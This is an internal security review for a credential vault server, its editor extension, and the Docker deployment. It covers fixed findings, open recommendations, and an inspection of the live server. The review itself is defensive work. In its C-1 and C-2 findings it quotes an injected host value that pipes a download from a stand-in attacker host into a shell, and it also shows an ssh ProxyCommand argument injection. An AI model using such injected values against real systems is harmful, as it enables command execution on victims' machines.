# Security review — 2026-08-24, the day before the company launch

> Scope: the whole product as it will be deployed — the **public** Cred Vault Server behind
> nginx, the extension installed by employees, the Docker stack, and the dependency trees of
> both halves. Four parallel reviews (server surface, cryptography, extension, deployment) plus
> a git-history secret scan and a dependency sweep run directly.
>
> Predecessor: [SECURITY_REVIEW_2026-08-23.md](SECURITY_REVIEW_2026-08-23.md). Every claim that
> review made about a fix was re-verified against the code rather than trusted — one of them had
> been undone in the meantime, which is finding **C-3**.

## The short version

**Three CRITICAL findings, all fixed and each reproduced before it was fixed.** Two of them are
the same root cause wearing different clothes: an entity's `host` field is attacker-influenced,
and two different parsers downstream took it as instructions. One is a server-side denial of
service that a single authenticated colleague could repeat at will.

**No leaked secrets.** The git history was scanned across every commit, not only the working
tree; nothing has ever been committed. **No vulnerable dependencies** in either half.

The cryptography is sound and current: AES-256-GCM with per-write random nonces, scrypt at
`N=2^17` (which is what OWASP recommends where Argon2id is unavailable), no legacy primitive
anywhere in either codebase. The one weakness in that area was not the algorithms but the **PIN
policy in front of them**, which is now fixed.

## What was fixed before launch

| | Finding | Where |
|---|---|---|
| **C-1** | A shared or synced entity ran local commands on **Connect** | `sshCommand.ts` |
| **C-2** | The same field made `ssh` run a local command with **no shell involved** | `sshExecCommand.ts` |
| **C-3** | One colleague could **OOM the server for everyone**, repeatedly | `Models.cs`, `Program.cs` |
| **H-1** | A synced entity ran a command through the **env-variable probe** | `envProbe.ts`, `types.ts` |
| **H-2** | **nginx**, the only container facing the internet, had no ceiling | `docker-compose.yml` |
| **H-3** | **certbot** — which holds the certificate private keys — ran on `:latest` | `docker-compose.yml` |
| **M-2** | The **anonymous rate-limit bucket** held the whole internet | `Program.cs` |
| **M-1** | The **PIN floor** accepted `12345678` on a blob attacked offline | `pinPolicy.ts` |

### C-1 · A shared entity ran local commands on Connect (CRITICAL, fixed)

`buildSshCommand` quoted `sshKeyPath` from its first version and never quoted `user@host`. The
composed line goes to `terminal.sendText(line, true)` — the `true` presses Enter.

`host` is not our string. Sync merges whatever a shared vault location holds, and Accept Share
imports whatever a colleague sealed; the envelope's GCM tag authenticates the **container**, not
the plausibility of a field inside it. So a host of `a.com; curl http://evil/x|sh` ran on the
click of Connect, under an entity name the victim had chosen to trust.

### C-2 · The same field, and `shell: false` was no defence (CRITICAL, fixed)

`buildSshExecArgv` pushed the destination as a bare positional argument. ssh's own getopt reads
a leading dash as a **flag**, so a host of `-oProxyCommand=…` is not a hostname — it is an
instruction to run a local command *before* authenticating anything.

This one is worth dwelling on, because the exec path was documented as safe on the grounds that
it never touches a shell. That is true and it does not help: the injection is in **ssh's**
parser, not a shell's. Reproduced against OpenSSH 10.3 with a benign marker — the file was
written.

**Both are now refused at composition rather than escaped.** `isSafeSshHost` / `isSafeSshUser`
reject anything that is not a hostname or an account name, and the exec path additionally passes
`--` before the destination. Escaping would answer the first parser and not the second, and a
value that cannot be a hostname has no honest use. Windows domain accounts (`CORP\alice`),
machine accounts (`HOST$`) and bracketed IPv6 still work.

### C-3 · A repeatable outage for the whole company (CRITICAL, fixed)

Two defects that only matter together:

1. `PayloadBytes()` counted the sealed fields and the entity name. **`EntityKind` was not
   counted and not bounded** — it is never routed on and never hashed into a path, which is
   exactly why nobody thought about it.
2. `GET /api/shares` read the entire inbox into one `List<ShareItem>` before writing a byte.
   The streaming fix from the 2026-08-23 review had been **undone by the Native-AOT migration**,
   and `module_server.md` recorded the materialization as safe *because the inbox is capped* —
   the cap that (1) walks around.

So: any authenticated same-domain colleague posts shares to a real victim with `entityKind`
padded to megabytes, bounded only by Kestrel's ~8 MB body limit, into an inbox that holds 500
items. The victim's next sync reads it all into a 512 MiB container. The container restarts, the
items are still on disk, and the next read repeats it.

Now every client-controlled field counts toward the cap, `EntityKind` is bounded where the shape
is judged, and the array is written to the response as it is read.

### H-1 · A synced entity ran a command through the env probe (HIGH, fixed)

`envProbeCommand` interpolated the variable name into a line typed into a terminal with Enter
pressed. `isValidEnvName` was enforced on the form's own input **and nowhere else** — backwards,
since the form is the one source that was never hostile, while `envBindings` is plaintext
metadata that syncs. The probe now refuses a name that is not a name, and `isEntityMetadata`
rejects the whole entity at the door.

### M-1 · PIN strength, raised deliberately (fixed)

The floor was eight characters of anything, and accepted `12345678` and `password`.

Eight characters is NIST SP 800-63B's floor, and it is the wrong yardstick here. That guidance
is written for an authenticator **behind a rate limiter**, where an attacker gets a handful of
throttled tries. This PIN wraps a blob that deliberately lives where other people can read it —
a NAS folder, a vault server, a colleague's inbox — and is attacked **offline and unthrottled**.
At the shipped scrypt cost an all-digit eight-character PIN is 10^8 guesses: **tens of hours on
a single modern GPU**, less on a rented cluster.

**A share PIN is the sharper case.** A share is sealed with `recipientKeyId + pin`, and on the
server transport — the one recommended for teams, and the one you are launching — `recipientKeyId`
is the recipient's **email address**. Public, usually derivable from a name. There the PIN is not
half the secret; it is all of it. And "tell it to them out-of-band" is exactly the UX that
produces short numeric PINs spoken over the phone.

Now refused: all digits under twelve characters, one character repeated, and the obvious list.
Everything else is accepted with a live estimate of offline guessing time, which counts a word as
a word rather than as random characters — pessimistic on purpose, because the number is advice
about a secret.

### H-2 and H-3 · The edge had no ceiling, and the key-holding container floated (fixed)

`vault` carried `deploy.resources.limits.memory`; **nginx did not**, and it is the only service
with ports on `0.0.0.0`. An unbounded edge does not fall over alone — it takes the host, and with
it the container renewing the certificate and the one writing the backups. It now has a memory and
a CPU ceiling, both configurable, defaulting to 128m and one core.

`certbot/certbot:latest` held the ACME account key and the certificate private keys on a mutable
tag, re-pulled on every recreate — the one container where `VAULT_IMAGE`'s pinning discipline was
missing. Pinned to `v5.7.0`, above the 5.4 floor that `--ip-address` with `--webroot` needs.
`restore.sh`'s bare `alpine` is pinned to `alpine:3.20` to match the rest of the stack.

**Deliberately not done in the same pass:** `cap_drop: [ALL]` on nginx and certbot. It is the
right end state, but nginx's master process binds 80 and 443 as root and the correct
`cap_add: [NET_BIND_SERVICE]` combination needs to be watched actually starting. The Docker
daemon was not running on this machine, so it could not be — and an unverified hardening change
the night before a launch is a worse trade than the hardening is a gain. Do it with the stack up.

### M-2 · The anonymous rate-limit bucket held the whole internet (fixed)

The **authenticated** half was already right: the limiter partitions on the verified caller
email, and the middleware that resolves it deliberately runs just before `UseRateLimiter`, which
is what makes that possible. That half was verified and is covered by a test.

The **anonymous** half fell back to `RemoteIpAddress`. This container publishes no port — every
request arrives through nginx on the docker network — so that address is nginx's, for every
caller alive. One bucket of 120 per 10 seconds for the entire internet: enough unauthenticated
traffic from one sender and the public health probe and every legitimate 401 start answering 429.

The fix is ASP.NET Core's own `UseForwardedHeaders`, and the reason it is safe here rather than
a new hole is worth writing down, because trusting a client-supplied header is ordinarily how a
rate limiter is lost. nginx sets `$proxy_add_x_forwarded_for`, which **appends** the address it
observed to whatever the client sent — so the rightmost entry is the proxy's own observation, and
`ForwardLimit = 1` reads exactly that one. `KnownIPNetworks` then restricts the mechanism to
requests arriving from a private address, which, with no published port, is the only way in.
`XForwardedProto` is deliberately **not** enabled: `RequireForwardedHttps` reads that header
itself and treats a missing one as plaintext, and letting the middleware consume it would quietly
turn that guard into something else.

Two tests, the second of which is the one that matters: two anonymous callers from different
addresses no longer share a budget, and a caller **cannot** mint a fresh budget by prepending
addresses of their own — only the entry nginx appended counts.

## Open — not fixed, with a recommendation for each

Ordered by what I would do first. None is a reason to hold tomorrow's launch.

### O-4 · WebAuthn credentials are scoped to bare `localhost` (MEDIUM, pre-existing)

Already item 1 of [../todo/PLAN_extension_security_tail.md](../todo/PLAN_extension_security_tail.md).
WebAuthn scopes a credential by RP-ID **string**, not by origin and port, so any local page on any
`localhost:<port>` can ask for the same credential — and `credentialId` and `prfSalt` sit in
plaintext in the vault envelope, on shared storage by design. It needs a local page, a physical
touch, and the user not reading the browser prompt. Not remote and not silent, but the hardware
factor is not actually scoped to this extension, which is what it is sold as. Fixing it breaks
existing registrations, which is why that plan sequences it last — do it deliberately, not the
night before a launch.

### O-5 · Share metadata is unauthenticated on the NAS transport (MEDIUM, pre-existing, mitigated by deployment)

`fromEmail` and `entityName` sit beside the sealed blob without AAD, so anyone who can write to a
shared folder can label a share as coming from a colleague. **The server transport is immune** —
it stamps the sender from the verified token — and that is what you are deploying. This is a
reason to keep teams on the server and never to offer the folder transport as a team option.

### O-6 · A `terminal`-kind entity runs its stored command verbatim (MEDIUM)

`Run in Terminal` executes without a preview, justified in the module doc on the grounds that
"these are commands the user wrote themselves". That premise does not survive sync and Accept
Share, both first-class features. On the server transport the sender is stamped, so a hostile
command arrives with a name attached — a real mitigation, not a fix. Recommendation: mark
entities that arrived from elsewhere and require one confirmation showing the composed line
before the first run, mirroring what the agent broker already does for its first use.

### O-7 · `keytar` runs `node-gyp rebuild` at `npm ci` (LOW)

Transitive through `@vscode/vsce`, a dev dependency that never ships to a user. It executes code
at install time on developer machines and in CI. Use `npm ci --ignore-scripts` in CI where
packaging is not the job.

### O-8 · No OCSP stapling; GitHub Actions pinned by tag rather than SHA (LOW)

The standard remaining items on an otherwise strong configuration. Neither is urgent.

## Verified sound — what was checked and held

This is the half of an audit that usually goes unwritten, and it is the half that says what was
actually looked at.

**Secrets.** Every commit in the repository's history was scanned for private-key material, `.env`
files, cloud credentials, tokens and credential assignments — not merely the working tree, because
a secret deleted in a later commit is still published. **Nothing has ever been committed.** The
only private key on disk is throwaway output from the local ACME test harness, git-ignored by
name. `.env.example` has only ever held placeholders.

**Dependencies.** `dotnet list package --vulnerable --include-transitive` and `--deprecated`: clean
in both projects. `npm audit` including dev: zero. The JWT library moved to 8.22.0.
`FluentAssertions` deliberately stays at 7.2.2 — 8.x is the Xceed Community License,
non-commercial only, which stops being a footnote the moment this is used commercially.

**Cryptography.** AES-256-GCM with a fresh 16-byte salt and 12-byte IV on **every** write — no
nonce reuse, which is the failure that would matter most. scrypt `N=2^17, r=8, p=1`: current OWASP
guidance where Argon2id is unavailable, and memory-hard, which is the property that resists GPUs
rather than merely being slow. The KDF-parameter **downgrade attack does not work** — the derived
key is a function of `N`, so tampering with the recorded parameters breaks the GCM tag instead of
weakening anything. Each key wrap is sealed independently, so one wrap's compromise cannot forge
another. **No MD5, SHA-1, low-iteration PBKDF2, ECB, static IV or `Math.random()` anywhere in
either codebase.**

**Server authorization.** Every endpoint derives its resource from the verified token and nothing
else; none accepts a caller identifier from a route, query or body. Share sender identity is
stamped from the token. `alg=none` and wrong-key tokens are rejected. Filesystem keys are SHA-256
hashes of the normalized email, so an email never reaches a filename. Startup refuses to run with
no auth scheme, an empty domain list, or an HMAC key under 32 bytes. No secret, token or ciphertext
reaches any log. Errors return a fixed string, never a stack trace.

**Container and edge.** The app runs as uid 10001, read-only rootfs, all capabilities dropped,
`no-new-privileges`, and **publishes no port at all** — reachable only through nginx. No Docker
socket is mounted anywhere. The stack's nginx template carries TLS 1.2/1.3 only with a modern
cipher list, HSTS with `includeSubDomains`, CSP, `X-Content-Type-Options`, `X-Frame-Options`, and
`gzip off` — the last deliberate, to deny a BREACH-style side channel against ciphertext.

> **Correction, 2026-08-25.** The sentence above is true of the template and was **false of the
> running deployment**, which is the distinction this review failed to make. See L-1 below: the
> live server runs `TLS_MODE=none` behind a host nginx, so that template is not in the path of a
> single real request. Reviewing a configuration file is not reviewing a deployment.

**Extension.** Webviews use `default-src 'none'` with nonce-scoped scripts and empty
`localResourceRoots`; every interpolated field is escaped. Secrets never enter a webview, with one
deliberate and documented exception (the DB connection string in the edit form). Every clipboard
copy expires in 45 seconds and clears only what it wrote. Materialized private keys are `0600`,
named per call, deleted when the session ends and purged on activate and deactivate. The agent
broker binds loopback only, its token is 256 bits from a CSPRNG, and its ceilings on output,
wall-clock and concurrency are enforced in code rather than described in a comment.

**Backup and restore.** Verified archives, atomic writes, a refusal to let an empty source shadow
a good backup, and a rollback trap that restores state on any failure.

## Found on the live server, 2026-08-25 — and fixed there

The review above was a code and configuration review. The next morning the deployment itself was
inspected, and the most important finding of the whole exercise came from that, not from the code:
**the file being reviewed was not the file serving traffic.**

### L-1 · The stack's hardening was not in the path of any real request (HIGH, fixed)

The server runs `TLS_MODE=none` behind a **host** nginx that terminates TLS and proxies to the
container over loopback. That is a supported mode — and it means the hardened TLS server block in
`nginx/vault.conf.template` is never rendered. Everything in it was therefore inert.

What the public edge actually offered, measured:

| | before | after |
|---|---|---|
| TLS versions | **TLSv1, TLSv1.1**, 1.2, 1.3 | 1.2 / 1.3 — 1.0 and 1.1 verified refused |
| security headers | none at all | HSTS, CSP, `nosniff`, `DENY`, `no-referrer` |
| `Server:` | `nginx/1.24.0 (Ubuntu)` | `nginx` |
| compression of ciphertext | `gzip on` | `gzip off` |
| edge rate limiting | none | 20 r/s + connection cap, answering **429** |
| `X-Forwarded-For` | not set | set from `$remote_addr`, never appended |

Verified by measurement rather than by reading: TLS 1.0 and 1.1 refused by `openssl s_client`; 26
of 120 parallel requests answered 429. The two neighbouring sites on the same nginx were checked
still serving, and both original configs were backed up beside themselves.

### L-2 · Both rate limiters had collapsed into one bucket (HIGH, fixed)

The extra proxy hop meant `$remote_addr` was the host nginx for every caller alive — so nginx's own
`limit_req` in the container, and the application's anonymous partition (M-2 above), were each one
bucket for the entire internet. The edge limiter now partitions on the real client, and
`vault.conf.template` gained a `real_ip` block so the container resolves the true client the moment
the new image ships. `deploy/README.md` now states plainly that `none` and `custom` hand the
outer proxy responsibility for all of it, with the minimum configuration written out.

### L-3 · An editor was holding the live vault open (fixed by the operator)

`nano`, running as root since 08:45, had `…​.bin` open — the encrypted vault of a real account. The
application rewrote that file at 08:48. One Ctrl+O would have written the 08:45 buffer over it: a
silent rollback of the vault, losing whatever had synced in between. No plaintext was exposed (the
file is a JSON envelope around ciphertext) and the session was closed without saving — verified
afterwards: mtime and size unchanged, envelope intact, both key wraps present.

## What this review did not cover

- **No live penetration test** against the running deployment. This is a code and configuration
  review; the first real traffic is the first test of the whole assembly.
- **The restore rehearsal — corrected 2026-08-25.** This review first said it had never happened.
  That was wrong: [../todo/PLAN_server_ops.md](../todo/PLAN_server_ops.md) records it as done on
  2026-08-23, end to end against the published image, and the operator re-checked it on 2026-08-25
  and reports it working. The error came from reading that plan's opening summary, which still says
  "nobody has yet rehearsed a restore", instead of item 8 four dozen lines below it, which says the
  opposite. A stale sentence at the top of a document outranks a correct one in the middle, because
  the top is what gets quoted.
- **Password auth over askpass in the agent exec path** has no automated coverage — it needs a live
  SSH server. First real use is its proof.
